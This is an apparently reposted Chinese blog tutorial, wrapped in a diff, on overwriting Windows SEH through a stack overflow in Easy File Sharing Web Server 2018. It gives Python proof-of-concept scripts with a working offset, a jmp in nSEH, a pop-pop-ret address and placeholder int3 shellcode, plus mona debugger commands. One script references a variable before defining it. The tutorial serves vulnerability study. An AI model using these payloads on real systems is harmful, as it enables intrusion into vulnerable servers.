@@ -1,0 +1,380 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Windows漏洞学习之栈溢出覆盖SEH | 爱玩且很菜</title><meta name="keywords" content="PWN,栈溢出,SEH"><meta name="author" content="pyh"><meta name="copyright" content="pyh"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Windows漏洞学习之栈溢出覆盖SEH转载自https:&#x2F;&#x2F;forum.butian.net&#x2F;share&#x2F;1007 0x00 简介这篇文章主要是介绍SEH机制以及在实战中怎么利用栈溢出覆盖SEH达到绕过GS保护机制，从而执行你的shellcode。 0x01 SEH介绍Windows 需要它运行的软件能够从发生的错误中恢复，为此，它允许开发人员指定当程序遇到问题（或异常）并编写在出现错误时运行的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows漏洞学习之栈溢出覆盖SEH">
+<meta property="og:url" content="http://example.com/2021/11/05/Windows%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%A6%86%E7%9B%96SEH%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="爱玩且很菜">
+<meta property="og:description" content="Windows漏洞学习之栈溢出覆盖SEH转载自https:&#x2F;&#x2F;forum.butian.net&#x2F;share&#x2F;1007 0x00 简介这篇文章主要是介绍SEH机制以及在实战中怎么利用栈溢出覆盖SEH达到绕过GS保护机制，从而执行你的shellcode。 0x01 SEH介绍Windows 需要它运行的软件能够从发生的错误中恢复，为此，它允许开发人员指定当程序遇到问题（或异常）并编写在出现错误时运行的">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/wallhaven-5738y9.jpg">
+<meta property="article:published_time" content="2021-11-05T06:24:45.000Z">
+<meta property="article:modified_time" content="2022-06-08T11:35:03.406Z">
+<meta property="article:author" content="pyh">
+<meta property="article:tag" content="PWN">
+<meta property="article:tag" content="栈溢出">
+<meta property="article:tag" content="SEH">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/wallhaven-5738y9.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/11/05/Windows%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%A6%86%E7%9B%96SEH%E6%BC%8F%E6%B4%9E/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?var _hmt = _hmt || []; (function() { var hm = document.createElement("script"); hm.src = "https://hm.baidu.com/hm.js?1edf852d28f0a2b88704ac1412f5bb44"; var s = document.getElementsByTagName("script")[0]; s.parentNode.insertBefore(hm, s);})();";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Windows漏洞学习之栈溢出覆盖SEH',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-06-08 19:35:03'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if (GLOBAL_CONFIG_SITE.isHome && /iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/1580288142723622.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">24</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">20</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/wallhaven-5738y9.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">爱玩且很菜</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首頁</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 時間軸</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 標籤</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分類</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fa fa-heartbeat"></i><span> 清單</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音樂</span></a></li><li><a class="site-page child" href="/Gallery/"><i class="fa-fw fas fa-images"></i><span> 照片</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 電影</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友鏈</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 關於</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Windows漏洞学习之栈溢出覆盖SEH</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-11-05T06:24:45.000Z" title="发表于 2021-11-05 14:24:45">2021-11-05</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-06-08T11:35:03.406Z" title="更新于 2022-06-08 19:35:03">2022-06-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/Windows/">Windows</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/Windows/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/Windows/%E6%A0%88%E6%BA%A2%E5%87%BA/SEH/">SEH</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Windows漏洞学习之栈溢出覆盖SEH"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Windows漏洞学习之栈溢出覆盖SEH"><a href="#Windows漏洞学习之栈溢出覆盖SEH" class="headerlink" title="Windows漏洞学习之栈溢出覆盖SEH"></a>Windows漏洞学习之栈溢出覆盖SEH</h1><p>转载自<a target="_blank" rel="noopener" href="https://forum.butian.net/share/1007">https://forum.butian.net/share/1007</a></p>
+<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>这篇文章主要是介绍SEH机制以及在实战中怎么利用栈溢出覆盖SEH达到绕过GS保护机制，从而执行你的shellcode。</p>
+<h2 id="0x01-SEH介绍"><a href="#0x01-SEH介绍" class="headerlink" title="0x01 SEH介绍"></a>0x01 SEH介绍</h2><p>Windows 需要它运行的软件能够从发生的错误中恢复，为此，它允许开发人员指定当程序遇到问题（或异常）并编写在出现错误时运行的特殊代码（处理程序）。换句话说，Windows 为开发人员实现了一种结构化的方式来处理他们称之为结构化异常处理程序的异常。</p>
+<p>我们实际上可以通过覆盖原始的 SEH 代码来劫持这个过程来运行我们想要的代码。然后，让我们执行代码所需要做的就是通过写入缓冲区的末尾来故意触发错误（异常）。</p>
+<p>Windows SEH 实现了一系列代码块来处理异常，作为在单个块无法处理错误的情况下有多个回退选项的一种方式。此代码可以写入软件或操作系统本身。每个程序都有一个 SEH 链，即使是没有开发人员编写的任何错误处理代码的软件。下面有一张关于 SEH 链的图解：</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/lYisnTc.png" alt="lYisnTc"></p>
+<p>关于SEH的详细介绍我推荐看看这篇博客：<a target="_blank" rel="noopener" href="https://blog.csdn.net/chenlycly/article/details/52575260">https://blog.csdn.net/chenlycly/article/details/52575260</a></p>
+<h2 id="0x02-利用SEH"><a href="#0x02-利用SEH" class="headerlink" title="0x02 利用SEH"></a>0x02 利用SEH</h2><h3 id="基本步骤："><a href="#基本步骤：" class="headerlink" title="基本步骤："></a>基本步骤：</h3><ol>
+<li>首先要利用栈溢出漏洞得到溢出点到SEH结构体的偏移量。</li>
+<li>然后要得到shellcode的起始位置。</li>
+<li>触发异常。</li>
+</ol>
+<p>以上步骤是最基本的，在真实的环境中我们还需要考虑其他因素。</p>
+<h2 id="0x03-实验过程"><a href="#0x03-实验过程" class="headerlink" title="0x03 实验过程"></a>0x03 实验过程</h2><h3 id="实验环境与工具"><a href="#实验环境与工具" class="headerlink" title="实验环境与工具"></a>实验环境与工具</h3><p>攻击机：Kali-Linux-2021.2-vmware-amd64  192.168.xxx.xxx</p>
+<p>靶机：Win7 旗舰版  192.168.xxx.xxx</p>
+<p>漏洞程序：Easy File Sharing Web Server 2018 </p>
+<p>服务端口： 80</p>
+<p>调试器：Immunity Debugger-漏洞分析专用调试器（安装了mona插件）、X32dbg</p>
+<h3 id="本地调试"><a href="#本地调试" class="headerlink" title="本地调试"></a>本地调试</h3><p>利用Immunity Debugger打开漏洞程序Easy File Sharing Web Server 2018，并且让它跑起来：</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/121342.jpg" alt="121342"></p>
+<h4 id="确认漏洞"><a href="#确认漏洞" class="headerlink" title="确认漏洞"></a>确认漏洞</h4><p>我们需要通过快速验证脚本（POC） 来确认该漏洞。 下面是我构造的 Python 脚本，目的是发送5000个字符到目标服务器上（数量不同覆盖到的SEH也不同，不过本质一样，这里用5000做测试），我给它起名 easyfileshring_POC.py：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line">host = <span class="built_in">str</span>(sys.argv[<span class="number">1</span>])  <span class="comment">#第一个参数是目标ip</span></span><br><span class="line">port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])	 <span class="comment">#第二个参数是目标端口</span></span><br><span class="line"> </span><br><span class="line">a = socket.socket() </span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Connecting to: &quot;</span> + host + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(port)</span><br><span class="line">a.connect((host,port)) <span class="comment">#建立连接</span></span><br><span class="line"> </span><br><span class="line">buff = <span class="string">&#x27;a&#x27;</span> * <span class="number">5000</span>  <span class="comment">#发送内容</span></span><br><span class="line"> </span><br><span class="line">a.send(<span class="string">&quot;GET &quot;</span> + buff + <span class="string">&quot; HTTP/1.0\r\n\r\n&quot;</span>)</span><br><span class="line"> </span><br><span class="line">a.close()</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Done...&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后，我们打开kali运行该python脚本，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-05%20165420.jpg" alt="Screenshot 2021-11-05 165420"></p>
+<p>转动靶机上查看，</p>
+<p><img src="H:/Users/DH/%E6%A1%8C%E9%9D%A2/%E5%A4%8D%E7%8E%B0A/3/Screenshot%202021-11-05%20165637.jpg" alt="Screenshot 2021-11-05 165637"></p>
+<p>发现程序停住了，因为在读取地址EAX+4C里的值时发生读取错误，因为EAX = 61616161（即我们POC中发送的“a”的ascill）不是一个合法地址，说明程序发生了栈溢出，导致EAX的值是溢出的字符，我们打开Immunity Debugger的SEH chain，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-05%20170129.jpg" alt="Screenshot 2021-11-05 170129"></p>
+<p>查看SEH chain，发现SEH被覆盖成了溢出值</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/12143.jpg" alt="12143"></p>
+<p>这里我们再利用mona命令，生成5000个测试字符：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="type">!mona</span> <span class="string">pattern_create</span> <span class="number">5000</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-05%20173334.jpg" alt="Screenshot 2021-11-05 173334"></p>
+<p>然后去打开生成的pattern.txt，复制生成的5000个测试字符，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-05%20173427.jpg" alt="Screenshot 2021-11-05 173427"></p>
+<p>然后重启服务程序，并且将POC脚本中发送的内容改为这5000个测试字符，然后再用kali运行脚本，可以发现程序再次停止，键入以下mona命令，来寻找SEH的偏移量：</p>
+<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="addition">!mona findmsp</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-05%20174540.jpg" alt="Screenshot 2021-11-05 174540"></p>
+<p>可以知道4061字节可以覆盖到SEH，</p>
+<h4 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h4><p>首先我们知道SEH结构体中有两个成员，一个成员是SEH，另一个成员是NEXT SEH。其中SEH里存放的是一个异常处理函数的地址，而NEXT SEH里存放的是下一个指向SEH结构体的指针。</p>
+<p>所以我们可以利用栈溢出覆盖SEH和NEXT SEH的值并且触发GS保护机制（触发异常），然后程序就会执行这个我们覆盖的SEH，我们让这个SEH去执行一段<strong>最后能返回原来的栈上NEXT SEH位置的代码</strong>，执行我们覆盖的NEXT SEH里填写的<strong>jmp + 偏移数 指令</strong>，然后这个程序就能跳转到栈下方我们编写的shellcode，然后执行我们的shellcode。</p>
+<h5 id="这里你们肯定会冒出几个疑问？（这几个问题的答案正是我们构造payload的关键点）"><a href="#这里你们肯定会冒出几个疑问？（这几个问题的答案正是我们构造payload的关键点）" class="headerlink" title="这里你们肯定会冒出几个疑问？（这几个问题的答案正是我们构造payload的关键点）"></a>这里你们肯定会冒出几个疑问？（这几个问题的答案正是我们构造payload的关键点）</h5><p><strong>1.为什么SEH里填的地址不能直接是shellcode的地址？</strong></p>
+<p><strong>2.要让SEH去执行什么代码才能在最后让程序返回原来的栈上NEXT SEH位置？</strong></p>
+<p><strong>3.SEH里的指向代码地址从哪获得？</strong></p>
+<p><strong>4.NEXT SEH 里jmp的偏移数填多少比较好？</strong></p>
+<p><strong>1的答案是：</strong>因为程序默认都会开启 <strong>ALSR</strong>保护 —— 让堆、栈、共享库映射等线性区布局地址随机化，增加攻击者预测目的地址的难度，所以我们无法直接知道程序运行中shellcode在栈上的地址，所以我们要利用在NEXT SEH中填写的jmp来跳转到栈上shellcode起始位置。</p>
+<p><strong>2的答案是：</strong>要利用 <strong>pop-pop-ret</strong> 指令来达到我们预期的效果，原因要从Windows异常处理机制来解释：</p>
+<h6 id="Windows异常处理机制"><a href="#Windows异常处理机制" class="headerlink" title="Windows异常处理机制"></a>Windows异常处理机制</h6><p>在程序运行过程中，当触发了异常，程序尝试处理异常的时候，首先系统会执行异常的回调函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EXCEPTION_DISPOSITION</span><br><span class="line">__cdecl _except_handler( struct _EXCEPTION_RECORD *ExceptionRecord,</span><br><span class="line">                        void * EstablisherFrame,</span><br><span class="line">                        struct _CONTEXT *ContextRecord,</span><br><span class="line">                        void * DispatcherContext);</span><br></pre></td></tr></table></figure>
+
+<p>并在栈中压入一个<code>EXCEPTION_DISPOSITION Handler</code>结构，如下图</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/aHR0cHM6Ly9zdXBlcmoub3NzLWNuLWJlaWppbmcuYWxpeXVuY3MuY29tLzIwMjAwNTIyMjIwMDUzLnBuZw.png" alt="aHR0cHM6Ly9zdXBlcmoub3NzLWNuLWJlaWppbmcuYWxpeXVuY3MuY29tLzIwMjAwNTIyMjIwMDUzLnBuZw"></p>
+<p>这个时候，esp指向栈顶位置就是这个结构体。这个结构体中包含这从TEB（储存与线程相关的内容的结构体）中得到的第一个SEH结构体的位置。这个时候，通过Establisher Frame找到第一个SEH结构体的位置，执行异常处理函数。</p>
+<hr>
+<p>我们分析上面那张栈空间的图可以发现，当触发异常时，此时的esp指向的是EXCEPTION_DISPOSITION Handler，当执行异常处理函数（被我们改写成执行<strong>pop-pop-ret</strong>）时，esp向高地址移动8个字节，指向了Establisher Frame，存着SEH结构体的第一个成员（NEXT SEH)的地址，因此执行ret会将eip指向NEXT SEH,然后执行NEXT SEH里的指令。</p>
+<p><strong>3的答案是：</strong>从问题2的答案我们可以知道，我们需要在SEH中填写指向的<strong>pop-pop-ret</strong>代码的地址,从问题1的答案我们了解到程序都是默认开启<strong>ALSR</strong>保护的，所以这个地址肯定不是随便给的，那么我们怎么获得指向的<strong>pop-pop-ret</strong>代码的地址，这里我们利用强大的Mona达到我们的目的，在immunity—debuger的终端中键入：</p>
+<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line">!mona <span class="keyword">seh</span></span><br></pre></td></tr></table></figure>
+
+<p>它会帮我们找到那个POP POP RET代码块地址，获取的结果可以在seh.txt中查看</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-05%20203535.jpg" alt="Screenshot 2021-11-05 203535"></p>
+<p>首先在seh.txt中查找一个未开启 <strong>ALSR</strong> 和 <strong>SafeSEH</strong>（SEH 校验机制） 的模块，这里我们就选择第一个ImageLoad.dll：</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-05%20204406.jpg" alt="Screenshot 2021-11-05 204406"></p>
+<p>找一个ImageLoad.dll中 利用的寄存器一般不会影响程序运行的<strong>pop-pop-ret</strong>指令地址，同时略过带有“<strong>\x00</strong>“的地址 (尽量避免出现0x00 防止传送过程中被截断)，</p>
+<p>利用POC_2.py来测试程序能到运行到我们覆盖的NEXT SEH里的<strong>jmp + 偏移数 指令</strong>：</p>
+<p>POC_2.py（在前一个POC的基础上进行修改）:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"> </span><br><span class="line">host = <span class="built_in">str</span>(sys.argv[<span class="number">1</span>])  </span><br><span class="line">port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])	 </span><br><span class="line"> </span><br><span class="line">a = socket.socket() </span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Connecting to: &quot;</span> + host + <span class="string">&quot;:&quot;</span> + <span class="built_in">str</span>(port)</span><br><span class="line">a.connect((host,port)) </span><br><span class="line"></span><br><span class="line">offset = <span class="string">&#x27;a&#x27;</span> * <span class="number">4061</span>   	<span class="comment"># 覆盖SEH结构体的第一个成员NEXT SEH的偏移</span></span><br><span class="line">Nseh = <span class="string">&quot;\xeb\x14\x90\x90&quot;</span> 	<span class="comment"># jmp 0x14 指令</span></span><br><span class="line">seh = <span class="string">&quot;\xa3\x02\x01\x10&quot;</span> 	<span class="comment"># 我们找到的 pop-pop-ret 指令的地址——例如 0x100102a3</span></span><br><span class="line">nop = <span class="string">&quot;\x90&quot;</span> * <span class="number">20</span> 	<span class="comment"># nop指令——防止jmp跳转过头</span></span><br><span class="line">shellcode = <span class="string">&quot;\xcc&quot;</span> * <span class="number">32</span> 	<span class="comment"># 这里用 int3 来模拟shellcode</span></span><br><span class="line">exploit = offset + Nseh + seh + nop + shellcode</span><br><span class="line">fill =  <span class="string">&quot;b&quot;</span> * (<span class="number">5000</span>-<span class="built_in">len</span>(buff)) <span class="comment"># 防止栈溢出未触发异常</span></span><br><span class="line">buff = exploit + fill</span><br><span class="line"></span><br><span class="line">a.send(<span class="string">&quot;GET &quot;</span> + buff + <span class="string">&quot; HTTP/1.0\r\n\r\n&quot;</span>)</span><br><span class="line"> </span><br><span class="line">a.close()</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;Done...&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/1111111112.jpg" alt="1111111112"></p>
+<p>经过几次的更改对POC中seh的更改并测试，我终于找到一个合适的<strong>pop-pop-ret</strong>指令地址：0x100102a3</p>
+<p>让我们看看效果：</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-05%20221456.jpg" alt="Screenshot 2021-11-05 221456"></p>
+<p>程序再次断在了这个地方，原因是读取[EAX+4C]错误（触发了异常），因为这时EAX值被改成了我们写入的溢出值 “bbbb”，这时我们看看SEH Chain：</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-05%20221830.jpg" alt="Screenshot 2021-11-05 221830"></p>
+<p>SEH已经被改写为我们选择的<strong>pop-pop-ret</strong>指令地址了，很好，接下来我们按快捷键</p>
+<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Shift</span> + F<span class="number">9</span></span><br></pre></td></tr></table></figure>
+
+<p>执行Immunity Debugger的 <strong>忽略异常继续执行的命令</strong>，</p>
+<p><img src="https://my-tc-1308282641.cos.ap-guangzhou.myqcloud.com/markdown/typora-user-images/Screenshot%202021-11-05%20222342.jpg" alt="Screenshot 2021-11-05 222342"></p>
+<p>可以看到程序跑进我们写的 <strong>int3</strong> 指令里断下来了，我们离成功更近一步了，注意观察这时候是跑进我们写的第二个 <strong>int3</strong> 指令里，所以如果我们从第二个 <strong>int3</strong> 指令开始写入我们的shellcode，那么程序就会开始执行我们的shellcode，所以我们只要把POC_2.py的代码进行适当更改就能当成 exp（exploit——漏洞利用脚本）用了。</p>
+<p><strong>4的答案是：</strong>从问题3的答案中你可以看到，我在POC_2.py中填写的 jmp指令的 <strong>偏移数</strong> 是 0x14 (20),其实这个偏移数的大小没有一个严格的规定，但是它的大小不能超过它后面 <strong>nop</strong> 指令的数量，不然 jmp指令 就很可能在shellcode的起始地址后面落地。所以你可以让不断调试让 jmp 刚刚好跳到shellcode的起始地址上，也可以让 jmp指令 后面 <strong>nop</strong> 指令的数量尽可能大，确保 jmp跳到shellcode前面的 <strong>nop</strong> 指令上（ <strong>nop</strong> 指令是空指令，会直接跳过，直到遇到其他指令），这样程序都能正常执行你的shellcode。</p>
+<hr>
+<p>当你想通上面四个问题时，接下来你就能在把上面的POC_2.py中的shellcode改成你自己的shellcode了，即获得了这个漏洞程序的exp，easyfileshring_exp.py：</p>
